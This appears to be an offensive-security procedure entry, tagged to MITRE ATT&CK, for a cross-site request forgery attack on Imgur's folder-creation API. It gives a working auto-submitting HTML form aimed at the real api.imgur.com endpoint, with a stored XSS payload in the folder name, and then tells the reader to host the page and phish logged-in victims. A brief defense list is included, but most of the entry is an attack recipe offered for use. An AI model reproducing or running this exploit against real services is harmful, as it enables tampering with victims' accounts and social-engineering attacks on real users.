---
id: proc-imgur-csrf-folder
tags:
  - csrf
  - folder-creation
  - imgur
type: procedure
tools:
  - '[[tools/browser-based-exploitation]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/csrf-html-form-submit]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:57.802Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# CSRF Create Malicious Folder

## Summary

This procedure exploits the lack of CSRF protection in Imgur's folder creation API to remotely create a favorites folder with a malicious XSS payload in its name on behalf of an authenticated victim.

## Description

The attack targets the https://api.imgur.com/3/folders endpoint, which accepts POST requests with JSON payloads for folder name and privacy settings. Without CSRF tokens, an attacker can craft an auto-submitting HTML form that, when loaded by a victim, creates the folder. The name includes an XSS payload that remains stored until triggered. This requires the victim to be logged into Imgur; the payload executes later during normal usage.

## Requirements

1. Victim authenticated in Imgur browser session
2. Attacker controls a web server to host the malicious HTML page
3. Internet access to Imgur API

## Defense

Defensive measures and detection strategies:

- Implement CSRF tokens on all state-changing endpoints
- Sanitize and escape folder names to prevent XSS storage
- Monitor for anomalous folder creations from unusual referers

## Objectives

1. Store malicious payload in victim's account without direct input
2. Set up conditions for self-XSS execution
3. Enable stealthy delivery via social engineering

## Instructions

### Step 1: Craft Malicious HTML Form

**Context**: Create an HTML page that auto-submits the CSRF request to the API.

**Command** ([[commands/csrf-html-form-submit]]):
```html
<html>
<body onload='document.forms[0].submit()'>
 <form method='POST' enctype='application/json' action='https://api.imgur.com/3/folders'>
 <input name='name' value='New Test"><img src=x onerror=prompt(2)>'>
 <input name='is_private' value='false'>
 </form>
</body>
</html>
```

> This form sets the folder name to include an XSS payload that breaks out of HTML context. Onload submits it automatically. Expected output: Browser sends POST to API, creating the folder if authenticated.

### Step 2: Host and Lure Victim

**Context**: Serve the page and trick the victim into visiting it while logged in.

**Instructions**: Upload the HTML to a web server (e.g., via GitHub Pages or ngrok). Send a phishing link to the victim. No command needed; relies on social engineering.

> Expected output: Victim's browser creates the folder silently.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/csrf-html-form-submit]]

## Tools Used

- [[tools/browser-based-exploitation]]

## Tags

- [[csrf]]
- [[imgur]]
- [[api-exploitation]]
